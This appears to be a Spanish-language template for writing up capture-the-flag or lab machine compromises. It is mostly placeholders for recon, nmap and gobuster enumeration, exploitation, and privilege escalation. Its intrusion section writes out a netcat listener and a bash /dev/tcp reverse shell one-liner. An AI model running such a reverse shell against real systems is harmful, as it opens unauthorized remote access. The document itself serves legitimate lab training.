
---
# Writeup Template: Maquina `[Nombre_Máquina]`

- Tags: `[Etiqueta1]` `[Etiqueta2]` `[Etiqueta3]`
- Dificultad: `[Baja/Media/Alta/Insane]`
- Plataforma: `[HTB/VulnHub/TryHackMe/Dockerlabs/HackMyVM/etc]`

---
## Enlace al laboratorio
`[Enlace_Descarga_o_Acceso]`

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
[comando_descompresion] [archivo_laboratorio]
[comando_despliegue] [configuracion]
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
[IP_TARGET]
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 [IP_TARGET] 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py [IP_TARGET]
# TTL: [Valor] -> [Sistema_Operativo]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t [IP_TARGET] -p [Rango_Puertos]

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn [IP_TARGET] -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p[Puertos_Abiertos] [IP_TARGET] -oN targeted
```

**Servicios identificados:**
```bash
# Aqui los servicios
```
---

## Enumeracion de [Servicio  Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://[IP_TARGET]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p [PORT] [IP_TARGET]
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] [Opciones_Adicionales]
```

**Hallazgos Relevantes:**
```bash
# Aqui las rutas importante
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://[IP_TARGET]/[Ruta] -w [Diccionario] -t [Hilos] -x [Extensiones]
```

- **Hallazgos**:
```bash
/admin (Status: 200) [Size: 1534]
/backup (Status: 301) [Size: 315]
```

### Credenciales Encontradas
- Usuario: `[Usuario]`
- Contraseña: `[Contraseña]`

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
[Descripción breve del método de explotación]

### Ejecucion del Ataque
```bash
# Comandos para explotación
[comando_explotacion]
```

### Intrusion
Modo escucha
```bash
nc -nlvp PORT
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/IP_TARGE/PORT <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
id
sudo -l
find / -perm -4000 2>/dev/null
```

**Hallazgos Clave:**
- Binario con privilegios: `[Binario]`
- Credenciales de usuario: `[Usuario]:[Contraseña]`

### Explotacion de Privilegios

###### Usuario `[ Nombre-Usuario ]`:

```bash
# Comando para escalar al usuario: ( root )
[comando_escalada]
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```

---

## Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]
3. [Lección 3]

## Recomendaciones de Seguridad
- [Recomendación 1]
- [Recomendación 2]
- [Recomendación 3]

